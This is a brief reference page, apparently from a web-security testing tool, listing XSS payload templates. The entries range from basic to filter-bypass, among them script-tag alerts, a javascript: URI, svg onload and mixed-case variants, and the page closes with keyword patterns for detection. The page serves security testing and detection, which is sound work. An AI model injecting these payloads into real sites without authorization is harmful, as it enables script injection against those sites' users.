# XSS Payload Templates

## Overview
- Purpose: Provide reusable XSS payload strings for basic, advanced, and bypass testing.
- Category: web_security
- Severity: info
- Tags: xss, payloads, web_security, injection

## Context and Use-Cases
- Fuzzing and validating client-side script injection surfaces.
- Used as inputs for automated or manual XSS testing.

## Key Parameters and Inputs
- attack_type (string): "xss"
- complexity (string): one of [basic, advanced, bypass]

## Procedure
1. Select `complexity` based on desired aggressiveness.
2. Use payloads directly or allow the generator to produce URL-encoded variants.

## Examples
- Payloads (basic/advanced/bypass):
```
<script>alert('XSS')</script>
javascript:alert('XSS')
"/><script>alert('XSS')</script><!--
<svg/onload=alert('XSS')>
<details ontoggle=alert('XSS')>
```

## Indicators / Detection
- Patterns: Look for common XSS markers like `<script>`, `onload`, `javascript:` in inputs or logs.

## Limitations and Caveats
- Risk classification is based on simple keyword matches.

## Source Excerpts
- [S1] "xss": { "basic": ["<script>alert('XSS')</script>", "javascript:alert('XSS')", "'><script>alert('XSS')</script>"], ... }
- [S2] "bypass": ["<ScRiPt>alert('XSS')</ScRiPt>", "<svg/onload=alert('XSS')>", "<details ontoggle=alert('XSS')>"]
